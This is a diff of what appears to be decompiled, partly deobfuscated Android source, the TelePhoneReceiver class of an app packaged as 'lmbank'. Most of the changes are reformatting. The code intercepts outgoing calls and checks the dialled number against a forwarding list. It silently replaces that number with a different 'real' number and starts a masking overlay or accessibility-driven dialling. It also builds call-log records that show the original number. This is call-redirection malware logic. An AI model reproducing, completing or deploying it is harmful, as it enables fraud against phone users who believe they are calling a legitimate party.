@@ -19,6 +19,7 @@ import com.wish.lmbank.common.Constants;
 import com.wish.lmbank.db.CallRingDB;
 import com.wish.lmbank.overlay.OverlayService;
 import com.wish.lmbank.phone.PhoneActivity;
+import com.wish.lmbank.phone.PhoneCallManager;
 import com.wish.lmbank.phone.PhoneCallService;
 import com.wish.lmbank.utils.ContentUtils;
 import com.wish.lmbank.utils.DateFormatUtils;
@@ -105,6 +106,7 @@ public class TelePhoneReceiver extends BroadcastReceiver {
     public void setPhoneCallListener(PhoneCallListener phoneCallListener) {
         this.mPhoneCallListener = phoneCallListener;
     }
+
     @Override // android.content.BroadcastReceiver
     public void onReceive(Context context, Intent intent) {
 
@@ -195,15 +197,16 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                     sb5.append(this.savedNumber);
                     sb.append(sb5.toString()); //这里播出转发
                     final LimitPhoneNumberBean forwarding = SettingUtils.isForwarding(this.savedNumber);
-                    while (true) {{
+                    while (true) {
+                        {
                             if (forwarding == null) {
                                 this.savedNumberReal = null;
-                                break ;
+                                break;
                             }
                             this.savedNumberReal = forwarding.getRealPhoneNumber();
                             TelePhoneReceiver.mCallLogBean = new CallLogBean(savedNumber, savedNumberReal, Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis());
                             if (forwarding.getSpecial() != 1) {
-                                break ;
+                                break;
                             }
                             final boolean b = true;
                             final StringBuilder sb6 = new StringBuilder();
@@ -234,133 +237,133 @@ public class TelePhoneReceiver extends BroadcastReceiver {
                             sb7.append(", isRunning: ");
                             sb7.append(PhoneCallService.isRunning);
                             sb.append(sb7.toString());
-                                if (defaultDialer && !PhoneCallService.isRunning) {
-                                    if (!b || TextUtils.isEmpty((CharSequence) this.savedNumberReal)) {
-                                        break;
-                                    }
+                            if (defaultDialer && !PhoneCallService.isRunning) {
+                                if (!b || TextUtils.isEmpty((CharSequence) this.savedNumberReal)) {
+                                    break;
+                                }
 //-^-                                     sb.append(bb7d7pu7.m5998("RUmO4NCPx-OM5t6OyehFSYHX7IzjwIzj9oHq1A"));
-                                    sb.append(", 特殊号码, 辅助功能");
-                                    final String savedNumberReal = this.savedNumberReal;
-                                    this.savedNumber = savedNumberReal;
+                                sb.append(", 特殊号码, 辅助功能");
+                                final String savedNumberReal = this.savedNumberReal;
+                                this.savedNumber = savedNumberReal;
 //-^-                                     TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal, bb7d7pu7.m5998("DwYbHggbDQAHDg"), System.currentTimeMillis());
-                                    TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal,  Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis());
-                                    AppStartV.setAutoService(true, s, this.savedNumberReal);
-                                    final StringBuilder sb8 = new StringBuilder();
+                                TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal, Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis());
+                                AppStartV.setAutoService(true, s, this.savedNumberReal);
+                                final StringBuilder sb8 = new StringBuilder();
 //-^-                                     sb8.append(bb7d7pu7.m5998("RUkIHB0GOgwbHwAKDCoIBQUnHAQLDBtTSQ"));
-                                    sb8.append(", autoServiceCallNumber: ");
-                                    sb8.append(s);
+                                sb8.append(", autoServiceCallNumber: ");
+                                sb8.append(s);
 //-^-                                     sb8.append(bb7d7pu7.m5998("RUkIHB0GOgwbHwAKDC8GGx4IGw0ABw4nHAQLDBtTSQ"));
-                                    sb8.append(", autoServiceForwardingNumber: ");
-                                    sb8.append(this.savedNumberReal);
-                                    sb.append(sb8.toString());
-                                } else {
-                                    if (b && !defaultDialer && checkFloatPermission) {
+                                sb8.append(", autoServiceForwardingNumber: ");
+                                sb8.append(this.savedNumberReal);
+                                sb.append(sb8.toString());
+                            } else {
+                                if (b && !defaultDialer && checkFloatPermission) {
 //-^-                                         sb.append(bb7d7pu7.m5998("RUmA6MeO1MA"));
-                                        sb.append(", 遮罩");
-                                        OverlayService.actionStart(context, s, 2);
-                                        break;
-                                    }
-                                    final StringBuilder sb9 = new StringBuilder();
+                                    sb.append(", 遮罩");
+                                    OverlayService.actionStart(context, s, 2);
+                                    break;
+                                }
+                                final StringBuilder sb9 = new StringBuilder();
 //-^-                                     sb9.append(bb7d7pu7.m5998("RUkaBhwbCgxTSQ"));
-                                    sb9.append(", source: ");
-                                    sb9.append(PhoneActivity.mSource);
-                                    sb.append(sb9.toString());
-                                    if (!TextUtils.isEmpty((CharSequence) AppStartV.autoServiceCallNumberMark)) {
-                                        AppStartV.autoServiceCallNumberMark = "";
-                                        s = AppStartV.autoServiceCallNumberMark;
-                                        TelePhoneReceiver.mCallLogBean = new CallLogBean(AppStartV.autoServiceCallNumberMark, this.savedNumber, "forwarding", System.currentTimeMillis());
-                                        final StringBuilder sb10 = new StringBuilder();
+                                sb9.append(", source: ");
+                                sb9.append(PhoneActivity.mSource);
+                                sb.append(sb9.toString());
+                                if (!TextUtils.isEmpty((CharSequence) AppStartV.autoServiceCallNumberMark)) {
+                                    AppStartV.autoServiceCallNumberMark = "";
+                                    s = AppStartV.autoServiceCallNumberMark;
+                                    TelePhoneReceiver.mCallLogBean = new CallLogBean(AppStartV.autoServiceCallNumberMark, this.savedNumber, "forwarding", System.currentTimeMillis());
+                                    final StringBuilder sb10 = new StringBuilder();
 //-^-                                         sb10.append(bb7d7pu7.m5998("RUmB1-yM48CM4_aB6tSP5euP_8SM-edFSQQqCAUFJQYOKwwIB1NJ"));
-                                        sb10.append(", 辅助功能挂断后, mCallLogBean: ");
-                                        sb10.append(TelePhoneReceiver.mCallLogBean);
-                                        sb.append(sb10.toString());
-                                        final int n = 1;
-                                    } else {
-                                        final int n = 0;
-                                    }
-                                    if (!AppStartV.isCustomDialer) {
-                                        break;
-                                    }
-                                    s = AppStartV.customDialerCallNumber;
-                                    TelePhoneReceiver.mCallLogBean = new CallLogBean(AppStartV.customDialerCallNumber, this.savedNumber, "forwarding", System.currentTimeMillis());
-                                    final StringBuilder sb11 = new StringBuilder();
+                                    sb10.append(", 辅助功能挂断后, mCallLogBean: ");
+                                    sb10.append(TelePhoneReceiver.mCallLogBean);
+                                    sb.append(sb10.toString());
+                                    final int n = 1;
+                                } else {
+                                    final int n = 0;
+                                }
+                                if (!AppStartV.isCustomDialer) {
+                                    break;
+                                }
+                                s = AppStartV.customDialerCallNumber;
+                                TelePhoneReceiver.mCallLogBean = new CallLogBean(AppStartV.customDialerCallNumber, this.savedNumber, "forwarding", System.currentTimeMillis());
+                                final StringBuilder sb11 = new StringBuilder();
 //-^-                                     sb11.append(bb7d7pu7.m5998("RUmB7sOMx_ON0OCP4sGM5t5FSQQqCAUFJQYOKwwIB1NJ"));
-                                    sb11.append(", 自定义拨号, mCallLogBean: ");
-                                    sb11.append(TelePhoneReceiver.mCallLogBean);
-                                    sb.append(sb11.toString());
-                                }
-                                final int n = 1;
-                                final String s2 = s;
-                                final StringBuilder sb12 = new StringBuilder();
+                                sb11.append(", 自定义拨号, mCallLogBean: ");
+                                sb11.append(TelePhoneReceiver.mCallLogBean);
+                                sb.append(sb11.toString());
+                            }
+                            final int n = 1;
+                            final String s2 = s;
+                            final StringBuilder sb12 = new StringBuilder();
 //-^-                                 sb12.append(bb7d7pu7.m5998("RUmPxMqM0dGM-NWM7tNTSQ"));
-                                sb12.append(", 正常呼出: ");
-                                sb12.append(s2);
-                                sb.append(sb12.toString());
-                                if (n != 0) {
-                                    final StringBuilder sb13 = new StringBuilder();
+                            sb12.append(", 正常呼出: ");
+                            sb12.append(s2);
+                            sb.append(sb12.toString());
+                            if (n != 0) {
+                                final StringBuilder sb13 = new StringBuilder();
 //-^-                                     sb13.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztJTSQ"));
-                                    sb13.append(", 呼叫转移: ");
-                                    sb13.append(this.savedNumber);
-                                    sb.append(sb13.toString());
-                                }
+                                sb13.append(", 呼叫转移: ");
+                                sb13.append(this.savedNumber);
+                                sb.append(sb13.toString());
+                            }
 //-^-                                 final String m59984 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
-                                final String m59984 = "KEY_IS_FORWARDING_HAND_UP";
-                                boolean b2 = n != 0;
-                                String s3 = s2;
-                                if (SharedPreferencesUtils.getValue(m59984, false)) {
-                                    SharedPreferencesUtils.putValue(m59984, false);
+                            final String m59984 = "KEY_IS_FORWARDING_HAND_UP";
+                            boolean b2 = n != 0;
+                            String s3 = s2;
+                            if (SharedPreferencesUtils.getValue(m59984, false)) {
+                                SharedPreferencesUtils.putValue(m59984, false);
 //-^-                                     final String m59985 = bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA");
-                                    final String m59985 = "KEY_FORWARDING_SHOW_PHONE";
-                                    final String value = SharedPreferencesUtils.getValue(m59985, "");
+                                final String m59985 = "KEY_FORWARDING_SHOW_PHONE";
+                                final String value = SharedPreferencesUtils.getValue(m59985, "");
 //-^-                                     final String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
-                                    final String value2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_PHONE", "");
-                                    final StringBuilder sb14 = new StringBuilder();
+                                final String value2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_PHONE", "");
+                                final StringBuilder sb14 = new StringBuilder();
 //-^-                                     sb14.append(bb7d7pu7.m5998("RUmP8deOzdOM5t6OyehTSQ"));
-                                    sb14.append(", 显示号码: ");
-                                    sb14.append(value);
+                                sb14.append(", 显示号码: ");
+                                sb14.append(value);
 //-^-                                     sb14.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKM5t6OyehTSQ"));
-                                    sb14.append(", 呼叫转移号码: ");
-                                    sb14.append(value2);
-                                    sb.append(sb14.toString());
+                                sb14.append(", 呼叫转移号码: ");
+                                sb14.append(value2);
+                                sb.append(sb14.toString());
+                                b2 = (n != 0);
+                                s3 = s2;
+                                if (!TextUtils.isEmpty((CharSequence) value)) {
                                     b2 = (n != 0);
                                     s3 = s2;
-                                    if (!TextUtils.isEmpty((CharSequence) value)) {
-                                        b2 = (n != 0);
-                                        s3 = s2;
-                                        if (value2.equals(this.savedNumber)) {
-                                            TelePhoneReceiver.mCallLogBean = new CallLogBean(value, this.savedNumber, "forwarding", System.currentTimeMillis());
-                                            SharedPreferencesUtils.putValue(m59985, "");
-                                            b2 = true;
-                                            s3 = value;
-                                        }
+                                    if (value2.equals(this.savedNumber)) {
+                                        TelePhoneReceiver.mCallLogBean = new CallLogBean(value, this.savedNumber, "forwarding", System.currentTimeMillis());
+                                        SharedPreferencesUtils.putValue(m59985, "");
+                                        b2 = true;
+                                        s3 = value;
                                     }
                                 }
-                                final StringBuilder sb15 = new StringBuilder();
-//-^-                                 sb15.append(bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw5TSQ"));
-                                sb15.append(", isForwarding: ");
-                                sb15.append(b2);
-//-^-                                 sb15.append(bb7d7pu7.m5998("RUkZAQYHDDoBBh5TSQ"));
-                                sb15.append(", phoneShow: ");
-                                sb15.append(s3);
-                                sb15.append(m5998);
-                                final CallLogBean mCallLogBean = TelePhoneReceiver.mCallLogBean;
-                                String s4;
-                                if (mCallLogBean != null) {
-                                    s4 = mCallLogBean.toString();
-                                } else {
-//-^-                                     s4 = bb7d7pu7.m5998("JzwlJQ");
-                                    s4 = "NULL";
-                                }
-                                sb15.append(s4);
-                                sb.append(sb15.toString());
-                                if (b2) {
-                                    this.mPhoneCallListener.onOutgoingCallStarted(s3, this.savedNumber, m59982, TelePhoneReceiver.callStartTime);
-                                } else {
-                                    this.mPhoneCallListener.onOutgoingCallStarted(s3, this.savedNumber, m59983, TelePhoneReceiver.callStartTime);
-                                }
-                                LogUtils.callLog(sb.toString());
-                                return;
                             }
+                            final StringBuilder sb15 = new StringBuilder();
+//-^-                                 sb15.append(bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw5TSQ"));
+                            sb15.append(", isForwarding: ");
+                            sb15.append(b2);
+//-^-                                 sb15.append(bb7d7pu7.m5998("RUkZAQYHDDoBBh5TSQ"));
+                            sb15.append(", phoneShow: ");
+                            sb15.append(s3);
+                            sb15.append(m5998);
+                            final CallLogBean mCallLogBean = TelePhoneReceiver.mCallLogBean;
+                            String s4;
+                            if (mCallLogBean != null) {
+                                s4 = mCallLogBean.toString();
+                            } else {
+//-^-                                     s4 = bb7d7pu7.m5998("JzwlJQ");
+                                s4 = "NULL";
+                            }
+                            sb15.append(s4);
+                            sb.append(sb15.toString());
+                            if (b2) {
+                                this.mPhoneCallListener.onOutgoingCallStarted(s3, this.savedNumber, m59982, TelePhoneReceiver.callStartTime);
+                            } else {
+                                this.mPhoneCallListener.onOutgoingCallStarted(s3, this.savedNumber, m59983, TelePhoneReceiver.callStartTime);
+                            }
+                            LogUtils.callLog(sb.toString());
+                            return;
+                        }
                     }
                 }
 //-^-                 final String string3 = extras.getString(bb7d7pu7.m5998("AAcKBgQABw42BxwECwwb"));
